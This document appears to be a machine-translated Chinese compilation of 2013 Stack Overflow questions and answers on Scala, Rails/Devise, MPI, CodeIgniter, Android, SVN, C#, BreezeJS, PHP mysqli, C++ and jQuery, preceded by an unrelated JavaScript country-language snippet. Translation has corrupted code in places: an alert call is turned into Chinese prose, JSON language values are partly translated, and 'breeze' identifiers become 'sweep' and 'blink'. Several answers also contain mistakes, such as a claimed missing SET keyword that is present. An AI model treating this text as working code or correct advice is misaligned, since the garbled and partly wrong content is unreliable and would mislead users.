var countries = $.parseJSON('[{"CountryCode":"ABW","Language":"Dutch"},{"CountryCode":"ABW","Language":"English"},{"CountryCode": "ABW","Language":"Papiamento"},{"CountryCode":"ABW","Language":"Spanish"},{"CountryCode":"AFG","Language":"Balochi"},{ "CountryCode":"AFG","Language":"Dari"},{"CountryCode":"AFG","Language":"Pashto"},{"CountryCode":"AFG","Language":"土库曼语"},{"CountryCode":"AFG","Language":"Uzbek"},{"CountryCode":"AGO","Language":"Ambo"},{"CountryCode":"AGO","Language":"Chokwe"},{"CountryCode":"AGO","Language":"Kongo"},{"CountryCode":"AGO","Language":" Luchazi"},{"CountryCode":"AGO","Language":"Luimbe-nganguela"},{"CountryCode":"AGO","Language":"Luvale"},{"CountryCode":"AGO" ,"Language":"Mbundu"},{"CountryCode":"AGO","Language":"Nyaneka-nkhumbi"},{"CountryCode":"AGO","Language":"Ovimbundu"},{" CountryCode":"AIA","Language":"English"},{"CountryCode":"ALB","Language":"Albaniana"},{"CountryCode":"ALB","Language":"Greek"},{"CountryCode":"ALB","Language":"Macedonian"},{"CountryCode":"AND","Language":"Catalan" },{"CountryCode":"AND","Language":"French"},{"CountryCode":"AND","Language":"葡萄牙语"},{"CountryCode":"AND","Language" :"Spanish"},{"CountryCode":"ANT","Language":"Dutch"},{"CountryCode":"ANT","Language":"English"},{"CountryCode":"ANT" ,"Language":"Papiamento"},{"CountryCode":"ARE","Language":"阿拉伯语"},{"CountryCode":"ARE","Language":"Hindi"},{"CountryCode":"ARG","Language":"Indian Languages"},{"CountryCode":"ARG","Language":"Italian"},{ "CountryCode":"ARG","Language":"Spanish"},{"CountryCode":"ARM","Language":"Armenian"},{"CountryCode":"ARM","Language":"Azerbaijani "},{"CountryCode":"ASM","Language":"English"},{"CountryCode":"ASM","Language":"Samoan"},{"CountryCode":"ASM","Language ":"Tongan"},{"CountryCode":"ATG","Language":"克里奥尔英语"},{"CountryCode":"ATG","Language":"English"},{"CountryCode":"AUS","Language":"Arabic"},{"CountryCode":"AUS","Language":"Canton Chinese"},{"CountryCode" :"AUS","Language":"English"},{"CountryCode":"AUS","Language":"German"},{"CountryCode":"AUS","Language":"Greek"}, {"CountryCode":"AUS","Language":"Italian"},{"CountryCode":"AUS","Language":"Serbo-Croatian"},{"CountryCode":"AUS","Language" :"越南语"},{"CountryCode":"AUT","Language":"捷克语"},{"CountryCode":"AUT","Language":"German"},{"CountryCode":"AUT","Language":"Hungarian"},{"CountryCode":"AUT","Language":"Polish"},{"CountryCode":" AUT","Language":"罗马尼亚语"},{"CountryCode":"AUT","Language":"Serbo-Croatian"},{"CountryCode":"AUT","Language":"Slovene"}, {"CountryCode":"AUT","Language":"Turkish"},{"CountryCode":"AZE","Language":"Armenian"},{"CountryCode":"AZE","Language":"阿塞拜疆语"},{"CountryCode":"AZE","Language":"Lezgian"},{"CountryCode":"AZE","Language":"Russian"},{"CountryCode":"BDI","Language":"French"},{"CountryCode":"BDI","Language":"Kirundi"},{"CountryCode":"BDI", "Language":"Swahili"},{"CountryCode":"BEL","Language":"Arabic"},{"CountryCode":"BEL","Language":"Dutch"},{"CountryCode": "BEL","Language":"French"},{"CountryCode":"BEL","Language":"German"},{"CountryCode":"BEL","Language":"Italian"},{ "CountryCode":"BEL","Language":"Turkish"},{"CountryCode":"BEN","Language":"Adja"},{"CountryCode":"BEN","Language":"Aizo"}]');

警报（国家。长度）；

# arrays - 请帮我实现子集功能

> ID：14847938
> 
> 赞同：0
> 
> 时间：2013-02-13T06:42:43.907
> 
> 标签：arrays, scala

我试图将它复制到数组，但我不能接受两个（集合）参数

```
def subset(a:Set[Int],b:Set[Int]):Boolean={
    var x = new Array[Int](a.size)
    var y = new Array[Int](b.size) 
  } 
```

或者你能解释一下如何接收两个数组作为参数吗？

```
def main(args: Array[String]): Unit = {
    val a =  Set(2,3,4,5,6)
    val b = Set(2,3,4,5)
    var x = new Array[Int](a.size)
    var y = new Array[Int](b.size) 
```

我希望将 x 和 y 放入函数子集并做同样的事情，但不是通过 Set

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:54:55.633

您可以转换`Set`为`Array`或转换`Array`为`Set`：

```
scala> val array = Array(1, 3, 5)
array: Array[Int] = Array(1, 3, 5)

scala> array.toSet
res0: scala.collection.immutable.Set[Int] = Set(1, 3, 5)

scala> val set = Set(7, 3, 8)
set: scala.collection.immutable.Set[Int] = Set(7, 3, 8)

scala> set.toArray
res1: Array[Int] = Array(7, 3, 8) 
```

如果您希望程序将`Int`s 的集合作为命令行参数，则必须解析一个字符串：

```
object Test extends App {
  val x: Array[Int] = args(0).split(",").map{ _.toInt }
  val y: Array[Int] = args(1).split(",").map{ _.toInt }
  println("x: " + x.mkString("Array(", ", ", ")"))
  println("y: " + y.mkString("Array(", ", ", ")"))
} 
```

用法：

```
>scala Test "1,2,3" "10,0,-5"
x: Array(1, 2, 3)
y: Array(10, 0, -5) 
```

# ruby-on-rails - 使用 devise 登录时防止 User 中的 updated_at 字段被修改

> ID：14847939
> 
> 赞同：4
> 
> 时间：2013-02-13T06:42:45.983
> 
> 标签：ruby-on-rails, devise, rails-activerecord

我有一种情况，我需要使用`updated_at`所有模型的字段来创建同步功能。但是在用户模型的情况下，`updated_at`每次用户登录时都会修改该字段。更糟糕的是，当设备使用用户的凭据登录以同步数据时，该`updated_at`字段只是在同步开始之前就被修改了。

所以，我的问题是，有没有办法可以`updated_at`在用户登录时停止设计更新字段？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-10-08T22:32:11.770

这就是我所做的：覆盖 should_record_timestamps? 设计模型上的方法，以在仅更新设计字段时不更改 updated_at 列。这是代码，它处理 Devise::Trackable 和 Rememberable。

```
 def should_record_timestamps?
    (self.changes.keys.map(&:to_sym) - (Devise::Models::Trackable.required_fields(nil) + [:remember_token, :remember_created_at])).present? && super
  end 
```

这是在用户登录时不使缓存失效的好方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-03-16T19:29:25.483

设计已经改变，所以这个问题需要更新的答案。

在我的用户模型中，我覆盖了`updated_tracked_fields!`. 自2014 年[5 月 21 日 (v. 3.3.0)](https://github.com/plataformatec/devise/commit/451be888cb7c2e2e63222f012308f5304236a704)以来一直存在。

```
def update_tracked_fields!(request)
  update_tracked_fields(request)
  update_attrs = changes.each_with_object({}) do |(key, value), object|
    object[key] = value[1]
  end
  update(update_attrs)
end 
```

使用该`update`方法，而不是`save`因为它自动跳过验证和更新`updated_at`列，我重新设计了`update_attrs`因为`update`需要所有需要更新的列的哈希。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T07:09:35.963

您可以向模型添加另一列并更新其日期时间，而不是尝试更改`updated_at`工作方式。

否则，您需要更改设计以执行以下操作：

```
User.record_timestamps = false
# devise save/update action
User.record_timestamps = true 
```

# c - 使用 MPI 同时发送和接收

> ID：14847947
> 
> 赞同：1
> 
> 时间：2013-02-13T06:44:01.787
> 
> 标签：c, mpi, hpc

我有一个网络，其中进程向其邻居发送随机消息并同时从其邻居接收消息。我可以使用套接字和线程来做到这一点。一个线程接收消息，另一个线程向随机选择的邻居发送消息。是否可以使用 MPI_SEND 和 MPI_RECV 来实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T17:40:09.603

您可以在多线程环境中使用 MPI 调用。查看[MPI_Init_thread](http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Init_thread.html)函数的手册和本文：[http](http://www.mcs.anl.gov/~thakur/papers/mpi-threads.pdf) ://www.mcs.anl.gov/~thakur/papers/mpi-threads.pdf 。请注意，MPI-1 标准不需要实现是线程安全的，只有 MPI-2 需要（但您使用的实现很可能是 MPI-2）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T18:14:41.987

你对“同时”的定义是什么？

无论如何，您可能对[MPI_Sendrecv](http://www.netlib.org/utk/papers/mpi-book/node45.html#SECTION00360000000000000000)感兴趣：

> 发送-接收操作的语义是如果调用者分叉两个并发线程，一个执行发送，一个执行接收，然后将这两个线程连接起来，将获得什么。

# codeigniter - $this->form_validation->run() 未执行

> ID：14847952
> 
> 赞同：1
> 
> 时间：2013-02-13T06:44:25.993
> 
> 标签：codeigniter, tankauth

我在处理 codeignitor 表单时遇到问题，它不会在本地服务器上执行**$this->form_validation->run() 。**但它在实时服务器上确实工作得很好。我不知道是什么原因。这是我的控制器。

```
class Login extends CI_Controller
{
    function __construct(){
    parent::__construct();

}   

  function removeUser($record_id){
$a = new Alumni();
$a->removeConnections($record_id);
  }

function index(){
    $redir = isset($_GET['redir'])?$_GET['redir']:'admin';
    if ($this->tank_auth->is_logged_in()) {                                 // logged in
        redirect('admin');
    } elseif ($this->tank_auth->is_logged_in(FALSE)) {                      // logged in, not activated
        redirect('/login/send_again/');
    } else {
                    //
        $data['login_by_username'] = ($this->config->item('login_by_username', 'tank_auth') AND
        $this->config->item('use_username', 'tank_auth'));
        $data['login_by_email'] = $this->config->item('login_by_email', 'tank_auth');

        $this->form_validation->set_rules('login', 'Login', 'trim|required|xss_clean');
        $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean');
        $this->form_validation->set_rules('remember', 'Remember me', 'integer');
        // Get login for counting attempts to login
        if ($this->config->item('login_count_attempts', 'tank_auth') AND
                ($login = $this->input->post('login'))) {
            $login = $this->security->xss_clean($login);
                            //var_dump($login);
        } else {
            $login = '';
        }
                   //var_dump($this->input->post("remember"));
        $data['use_recaptcha'] = $this->config->item('use_recaptcha', 'tank_auth');
        if ($this->tank_auth->is_max_login_attempts_exceeded($login)) {
            if ($data['use_recaptcha'])
                $this->form_validation->set_rules('recaptcha_response_field', 'Confirmation Code', 'trim|xss_clean|required|callback__check_recaptcha');
            else
                $this->form_validation->set_rules('captcha', 'Confirmation Code', 'trim|xss_clean|required|callback__check_captcha');
        }

        $data['errors'] = array();
        $loginID = $this->input->post("login");
                    $pass = $this->input->post("password");
                    $remember = $this->input->post("remember");
                    if ($this->form_validation->run() === false) {

                     }else{
                        echo " logged in";// validation ok
                             $loginID = $this->input->post("login");
                             $pass = $this->input->post("password");
                             $remember = $this->input->post("remember");
                             //echo $loginID;
             if ($this->tank_auth->login(
                    $loginID,
                    $pass,
                    $remember,
                    $data['login_by_username'],
                    $data['login_by_email'])) {                             // success
                echo "success";
                redirect($redir);

            } else {
                $errors = $this->tank_auth->get_error_message();
                                    //echo "error";
                if (isset($errors['banned'])) {                             // banned user
                    $this->_show_message($this->lang->line('auth_message_banned').' '.$errors['banned']);

                } elseif (isset($errors['not_activated'])) {                // not activated user
                    redirect('/auth/send_again/');

                } else {                                                    // fail
                    foreach ($errors as $k => $v)   $data['errors'][$k] = $this->lang->line($v);
                }
            }

                    }
..... 
```

对不起，长代码请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:06:18.577

我没有看到你的构造函数中加载了库

```
public function __construct()
  {
     parent :: __construct();   
     $this->load->helper('url');
     $this->load->helper('cookie');
          //load the validation library
     $this->load->library('form_validation');
     $this->load->library("pagination");
  } 
```

# android - 如何写入目录“/sys/.....”中的文件

> ID：14847956
> 
> 赞同：-1
> 
> 时间：2013-02-13T06:44:40.230
> 
> 标签：android, permissions, android-ndk, sys

如何在 android 中使用 JNI 和 NDk 编辑 sys 目录中的文件。其实我需要编辑这些文件`"/sys/class/gpio/gpio41/value"`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T23:30:11.910

只是一点提示：使用 chmod 666 ...您将获得读/写权限，但您不需要硬件引脚的执行权限。

问候马丁

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T07:06:41.127

通过更改模式，您现在可以使用以下命令编辑文件：chmod 777 /sys/class/gpio/gpio41/value

# svn - svn 信息与 svn 日志差异

> ID：14847958
> 
> 赞同：1
> 
> 时间：2013-02-13T06:44:47.397
> 
> 标签：svn

Subversion 给了我一些令人困惑甚至矛盾的结果。我正在尝试获取一堆文件的最新提交号、日期和作者。存储库和工作副本的修订号是 6189。

`svn info path/to/file`在给我

*   时间表：正常
*   最后更改作者：鲍比
*   最后更改版本：5448
*   最后更改日期：2012-01-03 11:37:56 -0800（2012 年 1 月 3 日，星期二）
*   文本最后更新时间：2013-01-27 20:10:08 -0800（2013 年 1 月 27 日，星期日）

但是，当我检查时，`svn log path/to/file`我得到了一些不同的结果：

*   r5509 | 爱丽丝 | 2012-01-27 07:54:57 -0800（2012 年 1 月 27 日星期五）| 3行

我查看了修订版 5509 的差异，但我看不到该文件的任何提及。

任何人都可以提出导致差异的原因吗？修订版 5448 确实对文件进行了更改，所以我想我会相信的输出，`svn info`但我想了解为什么`svn log`给出不同的修订号。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T08:04:03.467

因为`svn log FILENAME`您将获得影响**的修订列表**`FILE`。如果 WC 中的 FILE 和 WC 未从 repo 更新为 HEAD，您将获得部分历史记录

如果您想获得透明且相关的结果，请使用存储库内的源命令

**样品**：

网址是[http://mayorat.ursinecorner.ru:8088/svn/Hello/trunk/Hello.fr.txt](http://mayorat.ursinecorner.ru:8088/svn/Hello/trunk/Hello.fr.txt)

```
>svn log http://mayorat.ursinecorner.ru:8088/svn/Hello/trunk/Hello.fr.txt -l 1 -q
------------------------------------------------------------------------
r35 | lazybadger | 2013-01-09 11:35:28 +0600 (Ср, 09 янв 2013)
------------------------------------------------------------------------ 
```

* * *

```
>svn info http://mayorat.ursinecorner.ru:8088/svn/Hello/trunk/Hello.fr.txt
Path: Hello.fr.txt
Name: Hello.fr.txt
URL: http://mayorat.ursinecorner.ru:8088/svn/Hello/trunk/Hello.fr.txt
Repository Root: http://mayorat.ursinecorner.ru:8088/svn/Hello
Repository UUID: 65c3f143-cc60-1d4e-9546-1f0378d96c08
Revision: 37
Node Kind: file
Last Changed Author: lazybadger
Last Changed Rev: 35
Last Changed Date: 2013-01-09 11:35:28 +0600 (Ср, 09 янв 2013) 
```

（“Last *”字段与日志数据相关）

* * *

奖励命令

```
>svn ls -v http://mayorat.ursinecorner.ru:8088/svn/Hello/trunk/Hello.fr.txt
     35 lazybadg           90 янв 09 11:35 Hello.fr.txt 
```

# c# - 拆分字典中的键值

> ID：14847963
> 
> 赞同：0
> 
> 时间：2013-02-13T06:45:30.357
> 
> 标签：c#, split, idictionary, oledbdatareader

我在字典中有几个键（代表主题），并且每个键关联了几个值（代码）。

代码主题

7DIM-039 通讯

7DIM-040 通讯

7DIM-041 通讯

7DIM-042 通讯

7DIM-043 通讯

为了将每个主题（键）与几个值（代码）相关联，我在查询中执行此操作。我创建了一本字典

```
Dictionary<string, List<string>> dict = new Dictionary<string,List<string>>();

while (dbReader.Read())
            {
                string code = (string)dbReader["CODE"];
                string subject = (string)dbReader["SUBJECT"];

                if (!dict.ContainsKey(subject))
                {
                    dict.Add(subject, new List<string> { code });
                }
                else
                {
                    dict[subject].Add(code);
                }
            } 
```

所以这就是结果

![在此处输入图像描述](../Images/37855ba5112c574b63106c25fcb29e11.png)

我遇到的问题是其中一些键用分号分隔（所以每个键有几个项目）所以自然我必须进行拆分。

例如：GenSubject；职业；听力技巧; 个人发展; 提问技巧；辅导/指导等

如何拆分这些值并仍然确保各种代码值与每个拆分值相关联？

```
foreach(var kvp in dict)
        {
            foreach (var s in kvp.Key)
            {
                //splitting the subject keys?
            }
        } 
```

我还设计了一种拆分方法

```
static string[] SplitStringAt(string splitItem, char character)
    {
        return splitItem.Split(character);
    } 
```

这是一个示例代码 GenSubject

7DIM-062 沟通、提问技巧、决策

7DIM-063 沟通、提问技巧、决策

7DIM-064 沟通、提问技巧、决策

7DIM-065 沟通、提问技巧、决策

7DIM-066 沟通、提问技巧、决策

7DIM-067 沟通、提问技巧、决策

所以我想要实现的是所有要“存储用于通信”的代码，以及用于提问技巧等的相同代码，但当然只有一次。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:56:13.420

试试这个...

```
 foreach (KeyValuePair<string, List<string>> kvp in dic)
        {
            if (kvp.Key.Contains(";"))
            {
                var lst = kvp.Value;
                foreach (string subKey in kvp.Key.Split(new[] {';'}, StringSplitOptions.RemoveEmptyEntries))
                {
                    dic[subKey] = lst;
                }
            }
        } 
```

### 一切都`subKey`必须是独一无二的！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T07:10:14.263

抱歉，您的问题包含一些我不明白的部分：您指的是键和分号，然后举一个例子，主题用逗号分隔。

我会假设你有用逗号分隔的主题。

如果您想在阅读时正确分配主题，请`subject`像之前对整个主题所做的那样，将每个项目拆分并分配给字典。

```
Dictionary<string, List<string>> dict = new Dictionary<string,List<string>>();

while (dbReader.Read())
{
  string code = (string)dbReader["CODE"];
  string subject = (string)dbReader["SUBJECT"];
  foreach (string singleSubject in subject.Split(','))
  {
    if (!dict.ContainsKey(singleSubject))
    {
      dict.Add(subject, new List<string> { code });
    }
    else
    {
      dict[subject].Add(code);
    }
 }
} 
```

# android - 如何在Android中结合ListView和TableLayout的滚动

> ID：14847967
> 
> 赞同：0
> 
> 时间：2013-02-13T06:46:15.637
> 
> 标签：android, listview, scroll, tablelayout

我在水平线性布局中有一个 ListView 和一个表格布局。我想结合滚动​​两个视图，即，如果我滚动列表视图，表格布局也应该滚动，反之亦然。我不能使用滚动视图，因为不建议将列表视图放在滚动视图中。

请建议，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:36:19.310

好吧，如果 ListView 足够小，以至于它可以与 TableLayout 同时滚动，那么也许您可以简单地将 ListView 替换为 LinearLayout，并将 TableLayout 和 LinearLayout 都放在 ScrollView 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T07:59:03.967

我不明白您为什么要将列表视图放在滚动视图中？因为据我记得 Listview 已经是可滚动的......

听起来有点奇怪.. 您在一个表中有水平行（水平线性布局），它们是已经可滚动的列表视图中的水平和垂直行（行/列）？列表视图再次是水平行..

* * *

编辑..或者我不太了解您，并且您在水平布局中有一个列表视图和一个表格布局。但是你可以在滚动视图中进行表格布局。这样滚动视图不包含列表视图。

请更详细地解释您要完成的工作！

# jquery-mobile - jquerymobile后台弹出禁用触摸

> ID：14847971
> 
> 赞同：0
> 
> 时间：2013-02-13T06:46:35.217
> 
> 标签：jquery-mobile, background, dialog, popup

抱歉，如果我用 jquerymobile 创建对话框弹出窗口时我的英语不好，我得到一个透明的背景，但是当我触摸它时，导致对话关闭，我如何使对话框在触摸背景时不会关闭，直到我触摸取消按钮？谢谢你

例如演示 jquerymobile [http://jquerymobile.com/demos/1.2.0/docs/pages/popup/index.html中的登录表单对话框按钮](http://jquerymobile.com/demos/1.2.0/docs/pages/popup/index.html)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-14T22:24:40.340

您可以按照文档中的描述添加 data-dismissible="false" 属性：http: [//api.jquerymobile.com/popup/#option-dismissible](http://api.jquerymobile.com/popup/#option-dismissible)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:59:50.990

jQM 弹出窗口的这种行为是设计使然。

看起来你只需要使用 jQM[模态对话框而不是弹出窗口](http://jquerymobile.com/demos/1.2.0/docs/pages/dialog/index.html)

# javascript - BreezeJS 数据库连接安全

> ID：14847972
> 
> 赞同：0
> 
> 时间：2013-02-13T06:46:47.460
> 
> 标签：javascript, breeze

**在BreezeJS**中与数据库交互是否安全？

例如，如果我使用以下代码，它会直接在 javascript 中清楚地显示数据库名称、表和查询本身。它是否与数据库建立了安全连接？

```
var manager = new breeze.EntityManager('api/northwind');

var query = new breeze.EntityQuery()
    .from("Employees");

manager.executeQuery(query).then(function(data){
    ko.applyBindings(data);
}).fail(function(e) {
    alert(e);  
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T07:19:39.130

行“var manager = new sweep.EntityManager('api/northwind');” 没有说关于数据库的任何内容。它是到 MVC 控制器的路由（在本例中为 webapi）。

以及“var query = new blink.EntityQuery().from("Employees");”这一行 与数据库没有任何关系，它是控制器中方法的名称。

考虑到您可以使用 mvc 提供的机制来保护控制器（例如 Authorize 属性），我认为使用微风没有任何风险。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T07:27:02.013

最终的安全性`breeze.js`取决于用于实际运行查询的编程语言。正如我在文档中看到的，它主要用于 ASP。

检查[TODO 示例](http://todo.breezejs.com/)`/api/todos/SaveChanges`，使用以下负载执行操作调用：

```
{
    "entities": [{
        "Id": 2908,
        "Description": "Wine",
        "CreatedAt": "2012-08-22T09:06:00.000Z",
        "IsDone": true,
        "IsArchived": false,
        "entityAspect": {
            "entityTypeName": "TodoItem:#Todo.Models",
            "entityState": "Modified",
            "originalValuesMap": {
                "IsDone": false
            },
            "autoGeneratedKey": {
                "propertyName": "Id",
                "autoGeneratedKeyType": "Identity"
            }
        }
    }],
    "saveOptions": {
        "allowConcurrentSaves": false
    }
} 
```

唯一敏感的是**Id**。即使您不使用 JavaScript，您仍然必须以一种或另一种方式公开一些数据。我并不是说这是最好的方法，但这并没有我能想到的任何直接缺点。至少不在 JS 组件中。

它代表应用程序（就像在任何情况下一样）清理用户的任何输入。这包括任何 AJAX 调用，无论是否通过**微风**完成。

如果您可以评论一些用于清理/运行查询的 ASP 代码，我们可以就此事提供更多见解。

所以总结一下。没有问题。JavaScript 本身不会连接到数据库，因此它没有任何固有的安全问题。

# php - PHP mysqli stmt unicode 乱码

> ID：14847973
> 
> 赞同：1
> 
> 时间：2013-02-13T06:46:54.213
> 
> 标签：php, mysqli

```
$HotelName = "Adams’ Inn";
$ID = 1;
$stmt = $sql->prepare("UPDATE coupons SET HotelName=? WHERE ID=?");
$stmt->bind_param("si",$HotelName,$ID);
$stmt->execute(); 
```

**输出：**亚当斯旅馆

顺便说一句，我有以下内容：

字符集：utf8

排序规则：utf8_general_ci

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:50:46.550

清单

1.  `$sql->set_charset('utf8')`连接后。
2.  `header('Content-Type: text/html; charset=utf-8');`在任何输出之前

涉及到两个方面 - 服务器和客户端。客户端是指 PHP 脚本，而不是 HTTP 客户端。服务器需要知道客户端期望什么编码。
你只设置服务器端编码，告诉mysql必须存储哪些编码数据。
但也有一个客户。

事实上，Mysql 在重新编码方面非常出色。只要一种编码可以翻译成另一种编码，Mysql就可以做到。例如，对于不同的客户。
现在对它的要求并不高，但这个功能是存在的。因此，Mysql 需要知道客户端支持哪种编码。为此目的`set_charset()`，存在功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:50:40.703

您的查询中缺少`SET`关键字

```
$HotelName = "Adams’ Inn";
$ID = 1;
$stmt = $sql->prepare("UPDATE coupons SET HotelName=? WHERE ID=?");
$stmt->bind_param("si",$HotelName,$ID);
if($result=$stmt->execute())
   echo "Data Updated Sucessfully!!!";
else
   echo "Error in Update"; 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-08-04T07:20:11.740

它是如此简单

就放

```
mysqli_set_charset($db_connection, 'utf8'); 
```

在你的数据库连接之后。

**例子**

```
$con=mysqli_connect("localhost", "root", "xxxxx","database");
mysqli_set_charset($con, 'utf8'); 
```

# c++ - unordered_map 判断key是否在map中

> ID：14847976
> 
> 赞同：0
> 
> 时间：2013-02-13T06:47:16.243
> 
> 标签：c++, g++, linked-list, unordered-map

我试过这段代码

```
 #include <iostream>
 #include <utility>
 #include <vector>
 #include <unordered_map>
 #include <stdexcept>

 using namespace std;

 int main() {
    unordered_map<int,int> parent_map;
    try {
        int a = parent_map[0];
        cout<<a<<endl;

    } catch (out_of_range oe) {
        cout<<"out of range"<<endl;
    }

    return 0;

 } 
```

我认为应该捕获超出范围的异常。但是，输出是

```
0 
```

我很困惑。我记得我以前有这个工作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T06:57:56.543

`operator[]`不抛出，你想试试[std::unordered_map::at](http://en.cppreference.com/w/cpp/container/unordered_map/at)

```
int a = parent_map.at(0); 
```

如果**找不到键，**`operator[]`也会插入一个元素。

 **并且您想通过引用捕获异常

```
catch (const out_of_range &oe) {
   cout<<"out of range: " << oe.what() <<endl;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:50:08.067

```
int a = parent_map[0]; 
```

`0`正在使用 key和 default value为 map 分配一个新条目`0`。

您实际上是在这样做：

```
parent_map[0] = int(); 
```

您要做的是`find()`地图中的键，并检查它不是容器的**末尾**。

```
if(parent_map.find(0) != parent_map.end())
{
  // Element exists.
} 
```**

# c# - 使用 C# 在 Skype 上错过的聊天记录

> ID：14847982
> 
> 赞同：4
> 
> 时间：2013-02-13T06:47:47.350
> 
> 标签：c#, skype4com

我正在尝试将未读聊天从 Skype 显示到我的 c# 应用程序。我曾经 `int msgCount=skype.MissedMessages.Count`获取未读消息的数量并尝试了给定的功能`skype.MissedChats.ToString()`和 `skype.get_Message(msgCount).ToString()`. 但它们显示“System._ComObject”。有什么建议么？？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T11:32:16.650

答案很简单，我得到如下..

```
 for (int i = 0; i < skype.MissedMessages.Count; i++)
            {
                if (skype.MissedMessages[i + 1].Type == TChatMessageType.cmeSaid)
                {
                    string unreadMessage = skype.MissedMessages[i + 1].Body;
                }
             } 
```

可以通过以下方式读取其他详细信息，例如发件人姓名 `skype.MissedMessages[i + 1].Sender`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T07:10:33.830

我猜想它需要您使用索引器来实际显示一条特定聊天消息的内容。现在你正在将 a 转换`ChatCollection`为字符串，我猜他们还没有实现，所以它只是返回`this.GetType().Name`.

我猜索引器会这样工作：

```
List<string> messages = new List<string>();
foreach (Char c in skype.MissedChats)
{
    try
    {
        messages.Add(c.Name);
    }
    catch (COMException) { } // Invalid chat
} 
```

# javascript - 如果显示 div B，则隐藏 div A

> ID：14847989
> 
> 赞同：0
> 
> 时间：2013-02-13T06:48:28.143
> 
> 标签：javascript, jquery

我使用 jquery 编写简单的脚本来弹出快速信息。当用户单击视图时，一些信息将使用 toggle() 显示并在用户再次单击时隐藏。这个脚本会循环 10 次。

但问题是我希望这个弹出窗口只显示一次，其余的将隐藏，现在当用户单击视图 1 和视图 2 时，所有弹出窗口将同时显示。

你可以检查我的 jsFiddle[点击这里](http://jsfiddle.net/ruslyrossi/LLLjx/5/)

```
<script>
    $(document).ready(function() {
        $("#view_1").click(function(e) {
            e.stopPropagation();
            $(".box_1").toggle();
        });
        $(document).click(function() {
            var $el = $(".box_1");
            if ($el.is(":visible")) {
                $el.fadeOut(200);
            }
        });
    });
</script> 
```

**我不确定如何将此脚本组合到一个函数中*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T06:56:08.320

这是您的[工作演示](http://jsfiddle.net/LLLjx/7/)

```
 $("a").click(function() {
        $('.contact_box').hide();
        $(this).next('div').show();
 }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:56:20.863

用来`hide()`隐藏你对应的盒子..

```
 $("#view_1").click(function(e) {
      e.stopPropagation();
     $(".box_2").hide();  <-----here
      $(".box_1").toggle();
  });

 $("#view_2").click(function(e) {
        e.stopPropagation();
        $(".box_1").hide();<-----here
        $(".box_2").toggle();
    }); 
```

[在这里](http://jsfiddle.net/bipen/LLLjx/9/)摆弄

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:57:13.550

应该 ：

在`$(".box_1").toggle();`这隐藏`$(".box_2").hide();`之前和在`$(".box_2").toggle();`这隐藏之前`$(".box_1").hide();`

这将起作用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:58:54.740

嗨使用下面的代码，

```
<script>
    $(document).ready(function() {
        $("#view_1").click(function(e) {
            e.stopPropagation();
            $(".box_1").toggle();
    var $el = $(".box_2");
            if ($el.is(":visible")) {
                $el.fadeOut(200);
            }
        });
        $(document).click(function() {
            var $el = $(".box_1");
            if ($el.is(":visible")) {
                $el.fadeOut(200);
            }
        });
    });
</script> 
```

希望这能解决你的问题

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T07:00:22.953

Toggle 也有回调函数，你可以使用它。

```
$(".box_1").toggle('slow', function() {
    // show hide code or fadeIn fadeOut or other animation
    $(".box_2").fadeOut('fast');
});
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-13T07:10:04.267

试试这个：

```
<div style="position:relative"> 
    <a style="cursor: pointer" id="view_1" class="my_view">View 1</a>

    <div class="contact_box box_1 content_box" style="display: none;">
        <div class="left" style="width:150px; margin-right:10px;">
            <img src="http://www.dunking-devils.com/images/samsung-logo_100x100.jpg"
            style="max-width:150px" />
        </div>
        <div class="contact_info left" style="width:250px">
            <div class="company_name">DIV A</div>
            <table width="100%" border="0" class="table_contact">
                <tr>
                    <td width="29">Name</td>
                    <td>: Jenson Button</td>
                </tr>
                <tr>
                    <td style="padding-right:0px">Phone</td>
                    <td>: 012-66558741</td>
                </tr>
                <tr>
                    <td style="padding-right:0px">Email</td>
                    <td>: jb@gmail.com</td>
                </tr>
            </table>
        </div>
</div>
</div>

<br>
<br>
<div style="position:relative"> 
    <a style="cursor: pointer" id="view_2" class="my_view">View 2</a>

    <div class="contact_box box_2 content_box" style="display: none;">
        <div class="left" style="width:150px; margin-right:10px;">
            <img src="http://www.dunking-devils.com/images/samsung-logo_100x100.jpg"
            style="max-width:150px" />
        </div>
        <div class="contact_info left" style="width:250px">
            <div class="company_name">DIV B</div>
            <table width="100%" border="0" class="table_contact">
                <tr>
                    <td width="29">Name</td>
                    <td>: Jenson</td>
                </tr>
                <tr>
                    <td style="padding-right:0px">Phone</td>
                    <td>: 012-88542215</td>
                </tr>
                <tr>
